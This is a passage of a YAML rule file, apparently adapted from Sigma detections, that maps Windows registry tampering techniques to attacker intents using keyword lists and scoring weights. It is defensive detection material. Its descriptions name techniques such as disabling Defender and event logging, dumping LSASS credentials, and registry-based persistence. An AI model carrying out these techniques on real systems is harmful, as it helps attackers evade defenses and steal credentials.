      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bf9e1387_b040_4393_9851_1598f8ecfae9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects disabling Windows Defender Exploit Guard Network Protection
  conditions:
    summary:
      regex_any:
      - disable
      - exploit
      - guard
      - network
      - protection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fcddca7c_b9c0_4ddf_98da_e1e2d18b0157
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the disabling of the Windows Defender eventlog as seen in relation
    to Lockbit 3.0 infections
  conditions:
    summary:
      regex_any:
      - disabled
      - windows
      - defender
      - eventlog
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8ffc5407_52e3_478f_9596_0a7371eafe13
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects disabling Windows Defender PUA protection
  conditions:
    summary:
      regex_any:
      - disable
      - protection
      - windows
      - defender
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_93d298a1_d28f_47f1_a468_d971e7796679
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects disabling Windows Defender Tamper Protection
  conditions:
    summary:
      regex_any:
      - disable
      - tamper
      - protection
      - windows
      - defender
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c7dcacd0_cc59_4004_b0a4_1d6cdebe6f3e
  intent: defense_evasion
  tactic: defense_evasion
  description: Administrative shares are hidden network shares created by Microsoft
    Windows NT operating systems that grant system administrators remote access to
    every disk volume on a network-connected system
  conditions:
    summary:
      regex_any:
      - disable
      - administrative
      - share
      - creation
      - startup
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f37b4bce_49d0_4087_9f5b_58bffda77316
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects tampering with autologger trace sessions which is a technique
    used by attackers to disable logging
  conditions:
    summary:
      regex_any:
      - potential
      - autologger
      - sessions
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_974515da_6cc5_4c95_ae65_f97f9150ec7f
  intent: defense_evasion
  tactic: defense_evasion
  description: Adversaries may disable or modify system firewalls in order to bypass
    controls limiting network usage
  conditions:
    summary:
      regex_any:
      - disable
      - microsoft
      - defender
      - firewall
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e2482f8d_3443_4237_b906_cc145d87a076
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects registry modifications that change features of internal Windows
    tools (malware like Agent Tesla uses this technique)
  conditions:
    summary:
      regex_any:
      - disable
      - internal
      - tools
      - feature
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ab871450_37dc_4a3a_997f_6662aa8ae0f1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects tampering with the MacroRuntimeScanScope registry key to disable
    runtime scanning of enabled macros
  conditions:
    summary:
      regex_any:
      - disable
      - macro
      - runtime
      - scan
      - scope
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0372e1f9_0fd2_40f7_be1b_a7b2b848fa7b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects registry modifications that disable Privacy Settings Experience
  conditions:
    summary:
      regex_any:
      - disable
      - privacy
      - settings
      - experience
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3ae1a046_f7db_439d_b7ce_b8b366b81fa6
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect set UseActionCenterExperience to 0 to disable the Windows security
    center notification
  conditions:
    summary:
      regex_any:
      - disable
      - windows
      - security
      - center
      - notifications
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5de03871_5d46_4539_a82d_3aa992a69a83
  intent: impact_operations
  tactic: impact
  description: Detects the modification of the registry to disable a system restore
    on the computer
  conditions:
    summary:
      regex_any:
      - registry
      - disable
      - system
      - restore
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e1aa95de_610a_427d_b9e7_9b46cfafbe6a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when an attacker or tool disables the  Windows Defender service
    (WinDefend) via the registry
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - service
      - disabled
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ba226dcf_d390_4642_b9af_b534872f1156
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the Windows EventLog channel permission values.
    It focuses on changes to the Security Descriptor Definition Language (SDDL) string,
    as modifications to these values can restrict access to specific users or groups,
    potentially aiding in defense evasion by controlling who can view or modify a
    event log channel. Upon execution, the user shouldn''t be able to access the event
    log channel via the event viewer or via utilities such as "Get-EventLog" or "wevtutil".

    '
  conditions:
    summary:
      regex_any:
      - windows
      - event
      - access
      - tampering
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e78c408a_e2ea_43cd_b5ea_51975cf358c0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect set EnableFirewall to 0 to disable the Windows firewall
  conditions:
    summary:
      regex_any:
      - disable
      - windows
      - firewall
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2f78da12_f7c7_430b_8b19_a28f269b77a3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects tampering with the "Enabled" registry key in order to disable
    Windows logging of a Windows event channel
  conditions:
    summary:
      regex_any:
      - disable
      - windows
      - event
      - logging
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_275641a5_a492_45e2_a817_7c81e9d9d3e9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect set DisallowRun to 1 to prevent user running specific computer
    program
  conditions:
    summary:
      regex_any:
      - disallowrun
      - execution
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d4e2745c_f0c6_4bde_a3ab_b553b3f693cc
  intent: persistence_installation
  tactic: persistence
  description: 'Detects when an attacker modifies values of the Disk Cleanup Handler
    in the registry to achieve persistence via autorun.

    The disk cleanup manager is part of the operating system.

    It displays the dialog box [] The user has the option of enabling or disabling
    individual handlers by selecting or clearing their check box in the disk cleanup
    manager''s UI.

    Although Windows comes with a number of disk cleanup handlers, they aren''t designed
    to handle files produced by other applications.

    Instead, the disk cleanup manager is designed to be flexible and extensible by
    enabling any developer to implement and register their own disk cleanup handler.

    Any developer can extend the available disk cleanup services by implementing and
    registering a disk cleanup handler.

    '
  conditions:
    summary:
      regex_any:
      - persistence
      - disk
      - cleanup
      - handler
      - autorun
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_04b45a8a_d11d_49e4_9acc_4a1b524407a5
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects when a user enables DNS-over-HTTPS.

    This can be used to hide internet activity or be used to hide the process of exfiltrating
    data.

    With this enabled organization will lose visibility into data such as query type,
    response and originating IP that are used to determine bad actors.

    '
  conditions:
    summary:
      regex_any:
      - over
      - https
      - enabled
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e61e8a88_59a9_451c_874e_70fcc9740d67
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the installation of a DNS plugin DLL via ServerLevelPluginDll
    parameter in registry, which can be used to execute code in context of the DNS
    server (restart required)
  conditions:
    summary:
      regex_any:
      - serverlevelplugindll
      - installed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bf4fc428_dcc3_4bbd_99fe_2422aeee2544
  intent: defense_evasion
  tactic: defense_evasion
  description: Potential adversaries stopping ETW providers recording loaded .NET
    assemblies.
  conditions:
    summary:
      regex_any:
      - logging
      - disabled
      - processes
      - sysmon
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b61e87c0_50db_4b2e_8986_6a2be94b33b0
  intent: persistence_installation
  tactic: persistence
  description: 'Detects changes to "DsrmAdminLogonBehavior" registry value.

    During a Domain Controller (DC) promotion, administrators create a Directory Services
    Restore Mode (DSRM) local administrator account with a password that rarely changes.
    The DSRM account is an Administrator account that logs in with the DSRM mode
    when the server is booting up to restore AD backups or recover the server from
    a failure.

    Attackers could abuse DSRM account to maintain their persistence and access to
    the organization''s Active Directory.

    If the "DsrmAdminLogonBehavior" value is set to "0", the administrator account
    can only be used if the DC starts in DSRM.

    If the "DsrmAdminLogonBehavior" value is set to "1", the administrator account
    can only be used if the local AD DS service is stopped.

    If the "DsrmAdminLogonBehavior" value is set to "2", the administrator account
    can always be used.

    '
  conditions:
    summary:
      regex_any:
      - directory
      - service
      - restore
      - mode
      - dsrm
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_973ef012_8f1a_4c40_93b4_7e659a5cd17f
  intent: data_staging
  tactic: collection
  description: 'Detects the enabling of the "EnablePeriodicBackup" registry value.
    Once enabled, The OS will backup System registry hives on restarts to the "C:\Windows\System32\config\RegBack"
    folder. Windows creates a "RegIdleBackup" task to manage subsequent backups.

    Registry backup was a default behavior on Windows and was disabled as of "Windows
    10, version 1803".

    '
  conditions:
    summary:
      regex_any:
      - periodic
      - backup
      - system
      - registry
      - hives
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_75180c5f_4ea1_461a_a4f6_6e4700c065d4
  intent: data_staging
  tactic: collection
  description: 'Detects the enabling of the Windows Recall feature via registry manipulation.
    Windows Recall can be enabled by setting the value of "DisableAIDataAnalysis"
    to "0".

    Adversaries may enable Windows Recall as part of post-exploitation discovery and
    collection activities.

    This rule assumes that Recall is already explicitly disabled on the host, and
    subsequently enabled by the adversary.

    '
  conditions:
    summary:
      regex_any:
      - windows
      - recall
      - feature
      - enabled
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ad89044a_8f49_4673_9a55_cbd88a1b374f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects .NET Framework CLR and .NET Core CLR "cor_enable_profiling"
    and "cor_profiler" variables being set and configured.
  conditions:
    summary:
      regex_any:
      - enabling
      - profiler
      - environment
      - variables
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7d995e63_ec83_4aa3_89d5_8a17b5c87c86
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects enabling TurnOffCheck which can be used to bypass defense of
    MSDT Follina vulnerability
  conditions:
    summary:
      regex_any:
      - scripted
      - diagnostics
      - turn
      - check
      - enabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0cb8d736_995d_4ce7_a31e_1e8d452a1459
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects tampering with EventLog service "file" key. In order to change
    the default location of an Evtx file. This technique is used to tamper with log
    collection and alerting
  conditions:
    summary:
      regex_any:
      - potential
      - eventlog
      - file
      - location
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_42205c73_75c8_4a63_9db1_e3782e06fda0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects applications being added to the "allowed applications" list
    of exploit guard in order to bypass controlled folder settings
  conditions:
    summary:
      regex_any:
      - suspicious
      - application
      - allowed
      - through
      - exploit
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e3fdf743_f05b_4051_990a_b66919be1743
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect change of the user account associated with the FAX service to
    avoid the escalation problem.
  conditions:
    summary:
      regex_any:
      - change
      - user
      - account
      - associated
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e3357ba_09d4_4fbd_a7c5_ad6386314513
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect possible persistence using Fax DLL load when service restart
  conditions:
    summary:
      regex_any:
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4fee3d51_8069_4a4c_a0f7_924fcaff2c70
  intent: execution
  tactic: execution
  description: Detects commonly-used chained commands and strings in the most recent
    'url' value of the 'TypedPaths' key, which could be indicative of a user being
    targeted by the FileFix technique.
  conditions:
    summary:
      regex_any:
      - filefix
      - command
      - evidence
      - typedpaths
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_44a22d59_b175_4f13_8c16_cbaef5b581ff
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the abuse of the exefile handler in new file association. Used
    for bypass of security products.
  conditions:
    summary:
      regex_any:
      - file
      - association
      - using
      - exefile
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_833ef470_fa01_4631_a79b_6f291c9ac498
  intent: persistence_installation
  tactic: persistence
  description: Detects when an attacker adds a new "Debugger" value to the "Hangs"
    key in order to achieve persistence which will get invoked when an application
    crashes
  conditions:
    summary:
      regex_any:
      - debugger
      - entry
      - hangs
      - persistence
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f10ed525_97fe_4fed_be7c_2feecca941b1
  intent: persistence_installation
  tactic: persistence
  description: Detects when an attacker modifies the registry value of the "hhctrl"
    to point to a custom binary
  conditions:
    summary:
      regex_any:
      - persistence
      - hhctrl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5df86130_4e95_4a54_90f7_26541b40aec2
  intent: persistence_installation
  tactic: persistence
  description: Hides the file extension through modification of the registry
  conditions:
    summary:
      regex_any:
      - registry
      - modification
      - hidden
      - file
      - extension
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5a5152f1_463f_436b_b2f5_8eceb3964b42
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects modifications to the "Hidden" and "ShowSuperHidden" explorer
    registry values in order to disable showing of hidden files and system files.

    This technique is abused by several malware families to hide their files from
    normal users.

    '
  conditions:
    summary:
      regex_any:
      - displaying
      - hidden
      - files
      - feature
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5a93eb65_dffa_4543_b761_94aa60098fb6
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects registry modifications that hide internal tools or functions
    from the user (malware like Agent Tesla, Hermetic Wiper uses this technique)
  conditions:
    summary:
      regex_any:
      - registry
      - hide
      - function
      - from
      - user
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5b16df71_8615_4f7f_ac9b_6c43c0509e61
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects when the "index" value of a scheduled task is modified from
    the registry

    Which effectively hides it from any tooling such as "schtasks /query" (Read the
    referenced link for more information about the effects of this technique)

    '
  conditions:
    summary:
      regex_any:
      - hide
      - schedule
      - task
      - index
      - value
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_555155a2_03bf_4fe7_af74_d176b3fdbe16
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the "HVCIDisallowedImages" registry value to potentially
    add a driver to the list, in order to prevent it from loading.

    '
  conditions:
    summary:
      regex_any:
      - driver
      - added
      - disallowed
      - images
      - hvci
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3fd4c8d7_8362_4557_a8e6_83b29cc0d724
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to Internet Explorer''s (IE / Windows Internet properties)
    ZoneMap configuration of the "HTTP" and "HTTPS" protocols to point to the "My
    Computer" zone. This allows downloaded files from the Internet to be granted the
    same level of trust as files stored locally.

    '
  conditions:
    summary:
      regex_any:
      - zonemap
      - setting
      - downgraded
      - mycomputer
      - zone
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b888e3f2_224d_4435_b00b_9dd66e9ea1f1
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects usage of Windows Input Method Editor (IME) keyboard layout
    feature, which allows an attacker to load a DLL into the process after sending
    the WM_INPUTLANGCHANGEREQUEST message.

    Before doing this, the client needs to register the DLL in a special registry
    key that is assumed to implement this keyboard layout. This registry key should
    store a value named "Ime File" with a DLL path.

    IMEs are essential for languages that have more characters than can be represented
    on a standard keyboard, such as Chinese, Japanese, and Korean.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - extension
      - keyboard
      - layout
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9d8f9bb8_01af_4e15_a3a2_349071530530
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects usage of Windows Input Method Editor (IME) keyboard layout
    feature, which allows an attacker to load a DLL into the process after sending
    the WM_INPUTLANGCHANGEREQUEST message.

    Before doing this, the client needs to register the DLL in a special registry
    key that is assumed to implement this keyboard layout. This registry key should
    store a value named "Ime File" with a DLL path.

    IMEs are essential for languages that have more characters than can be represented
    on a standard keyboard, such as Chinese, Japanese, and Korean.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - path
      - keyboard
      - layout
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d223b46b_5621_4037_88fe_fda32eead684
  intent: impact_operations
  tactic: impact
  description: Detects the addition of new root, CA or AuthRoot certificates to the
    Windows registry
  conditions:
    summary:
      regex_any:
      - root
      - authroot
      - certificate
      - store
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ab567429_1dfb_4674_b6d2_979fd2f9d125
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the Internet Explorer "DisableFirstRunCustomize"
    value, which prevents Internet Explorer from running the first run wizard the
    first time a user starts the browser after installing Internet Explorer or Windows.

    '
  conditions:
    summary:
      regex_any:
      - internet
      - explorer
      - disablefirstruncustomize
      - enabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8b9606c9_28be_4a38_b146_0e313cc232c1
  intent: impact_operations
  tactic: impact
  description: Detect changes to the "LegalNoticeCaption" or "LegalNoticeText" registry
    values where the message set contains keywords often used in ransomware ransom
    messages
  conditions:
    summary:
      regex_any:
      - potential
      - ransomware
      - activity
      - using
      - legalnotice
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3aff0be0_7802_4a7e_a4fa_c60c74bc5e1d
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects setting a custom URL for OneDriveStandaloneUpdater.exe to
    download a file from the Internet without executing any

    anomalous executables with suspicious arguments. The downloaded file will be in
    C:\Users\redacted\AppData\Local\Microsoft\OneDrive\StandaloneUpdaterreSignInSettingsConfig.json

    '
  conditions:
    summary:
      regex_any:
      - lolbas
      - onedrivestandaloneupdater
      - proxy
      - download
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_33efc23c_6ea2_4503_8cfe_bdf82ce8f719
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the setting of the "DumpType" registry value to "2" which stands
    for a "Full Dump". Technique such as LSASS Shtinkering requires this value to
    be "2" in order to dump LSASS.
  conditions:
    summary:
      regex_any:
      - lsass
      - full
      - dump
      - request
      - dumptype
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d6ce7ebd_260b_4323_9768_a9631c8d4db2
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the "DisableRestrictedAdmin" registry value in
    order to disable or enable RestrictedAdmin mode.

    RestrictedAdmin mode prevents the transmission of reusable credentials to the
    remote system to which you connect using Remote Desktop.

    This prevents your credentials from being harvested during the initial connection
    process if the remote server has been compromise

    '
  conditions:
    summary:
      regex_any:
      - restrictedadminmode
      - registry
      - value
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_92b0b372_a939_44ed_a11b_5136cf680e27
  intent: persistence_installation
  tactic: persistence
  description: Attempts to detect system changes made by Blue Mockingbird
  conditions:
    summary:
      regex_any:
      - blue
      - mockingbird
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c90362e0_2df3_4e61_94fe_b37615814cb1
  intent: persistence_installation
  tactic: persistence
  description: 'Detects changes to the Netsh registry key to add a new DLL value.
    This change might be an indication of a potential persistence attempt by adding
    a malicious Netsh helper

    '
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - netsh
      - helper
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e7b18879_676e_4a0e_ae18_27039185a8e7
  intent: persistence_installation
  tactic: persistence
  description: 'Detects changes to the Netsh registry key to add a new DLL value that
    is located on a suspicious location. This change might be an indication of a potential
    persistence attempt by adding a malicious Netsh helper

    '
  conditions:
    summary:
      regex_any:
      - netsh
      - helper
      - registered
      - from
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_28036918_04d3_423d_91c0_55ecf99fb892
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the NGenAssemblyUsageLog registry key.

    .NET Usage Log output location can be controlled by setting the NGenAssemblyUsageLog
    CLR configuration knob in the Registry or by configuring an environment variable
    (as described in the next section).

    By simplify specifying an arbitrary value (e.g. fake output location or junk data)
    for the expected value, a Usage Log file for the .NET execution context will not
    be created.

    '
  conditions:
    summary:
      regex_any:
      - ngenassemblyusagelog
      - registry
      - tamper
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0442defa_b4a2_41c9_ae2c_ea7042fc4701
  intent: credential_harvesting
  tactic: credential_access
  description: Detects when an attacker tries to add a new network provider in order
    to dump clear text credentials, similar to how the NPPSpy tool does it
  conditions:
    summary:
      regex_any:
      - potential
      - credential
      - dumping
      - attempt
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e4d22291_f3d5_4b78_9a0c_a1fbaf32a6a4
  intent: persistence_installation
  tactic: persistence
  description: Detects the registration of a new ODBC driver where the driver is located
    in a potentially suspicious location
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - odbc
      - driver
      - registered
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a5c46e9_f32f_42f7_b2bc_6e9084db7fbf
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects registry changes to Microsoft Office "AccessVBOM" to a value
    of "1" which disables trust access for VBA on the victim machine and lets attackers
    execute malicious macros without any Microsoft Office warnings.
  conditions:
    summary:
      regex_any:
      - trust
      - access
      - disable
      - vbapplications
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a5c7a43f_6009_4a8c_80c5_32abf1c53ecc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects changes to Microsoft Office protected view registry keys with
    which the attacker disables this feature.
  conditions:
    summary:
      regex_any:
      - microsoft
      - office
      - protected
      - view
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_17e53739_a1fc_4a62_b1b9_87711c2d5e44
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the registry value "PythonFunctionWarnings" that
    would prevent any warnings or alerts from showing when Python functions are about
    to be executed.

    Threat actors could run malicious code through the new Microsoft Excel feature
    that allows Python to run within the spreadsheet.

    '
  conditions:
    summary:
      regex_any:
      - python
      - function
      - execution
      - security
      - warning
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_63647769_326d_4dde_a419_b925cc0caf42
  intent: execution
  tactic: execution
  description: Enable Dynamic Data Exchange protocol (DDE) in all supported editions
    of Microsoft Word or Excel.
  conditions:
    summary:
      regex_any:
      - enable
      - microsoft
      - dynamic
      - data
      - exchange
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_396ae3eb_4174_4b9b_880e_dc0364d78a19
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the modification of Outlook setting "LoadMacroProviderOnBoot"
    which if enabled allows the automatic loading of any configured VBA project/module
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - outlook
      - loadmacroprovideronboot
      - setting
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e3b50fa5_3c3f_444e_937b_0a99d33731cd
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the modification of Outlook security setting to allow unprompted
    execution of macros.
  conditions:
    summary:
      regex_any:
      - outlook
      - macro
      - execution
      - without
      - warning
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6763c6c8_bd01_4687_bc8d_4fa52cf8ba08
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects an attacker trying to enable the outlook security setting "EnableUnsafeClientMailRules"
    which allows outlook to run applications or execute macros
  conditions:
    summary:
      regex_any:
      - outlook
      - enableunsafeclientmailrules
      - setting
      - enabled
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c3cefdf4_6703_4e1c_bad8_bf422fc5015a
  intent: persistence_installation
  tactic: persistence
  description: Detects changes to the registry values related to outlook security
    settings
  conditions:
    summary:
      regex_any:
      - outlook
      - security
      - settings
      - updated
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f742bde7_9528_42e5_bd82_84f51a8387d2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects changes to registry keys related to "Trusted Location" of Microsoft
    Office where the path is set to something uncommon. Attackers might add additional
    trusted locations to avoid macro security restrictions.
  conditions:
    summary:
      regex_any:
      - uncommon
      - microsoft
      - office
      - trusted
      - location
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a166f74e_bf44_409d_b9ba_ea4b2dd8b3cd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects registry changes to Office trust records where the path is
    located in a potentially suspicious location
  conditions:
    summary:
      regex_any:
      - macro
      - enabled
      - potentially
      - suspicious
      - document
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_91239011_fe3c_4b54_9f24_15c86bb65913
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects registry changes to Microsoft Office "VBAWarning" to a value
    of "1" which enables the execution of all macros, whether signed or unsigned.
  conditions:
    summary:
      regex_any:
      - office
      - macros
      - warning
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_df4dc653_1029_47ba_8231_3c44238cc0ae
  intent: persistence_installation
  tactic: persistence
  description: Detects potential persistence using Appx DebugPath
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - using
      - debugpath
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b86852fb_4c77_48f9_8519_eb1b2c308b59
  intent: persistence_installation
  tactic: persistence
  description: 'Detects the setting of the REGISTERAPPRESTART compatibility layer
    on an application.

    This compatibility layer allows an application to register for restart using the
    "RegisterApplicationRestart" API.

    This can be potentially abused as a persistence mechanism.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - appcompat
      - registerapprestart
      - layer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_707e097c_e20f_4f67_8807_1f72ff4500d6
  intent: persistence_installation
  tactic: persistence
  description: 'Detects changes to the "Default" property for keys located in the
    \Software\Microsoft\Windows\CurrentVersion\App Paths\ registry. Which might be
    used as a method of persistence

    The entries found under App Paths are used primarily for the following purposes.

    First, to map an application''s executable file name to that file''s fully qualified
    path.

    Second, to prepend information to the PATH environment variable on a per-application,
    per-process basis.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - paths
      - default
      - property
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e6fe26ee_d063_4f5b_b007_39e90aaf50e3
  intent: persistence_installation
  tactic: persistence
  description: Detects change the the "AutodialDLL" key which could be used as a persistence
    method to load custom DLL via the "ws2_32" library
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - autodialdll
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_976dd1f2_a484_45ec_aa1d_0e87e882262b
  intent: persistence_installation
  tactic: persistence
  description: Detects when an attacker modifies the registry key "HtmlHelp Author"
    to achieve persistence
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - helper
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_243380fa_11eb_4141_af92_e14925e77c1b
  intent: persistence_installation
  tactic: persistence
  description: Detects changes to the PSFactory COM InProcServer32 registry. This
    technique was used by RomCom to create persistence storing a malicious DLL.
  conditions:
    summary:
      regex_any:
      - potential
      - psfactorybuffer
      - hijacking
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_790317c0_0a36_4a6a_a105_6e576bf99a14
  intent: persistence_installation
  tactic: persistence
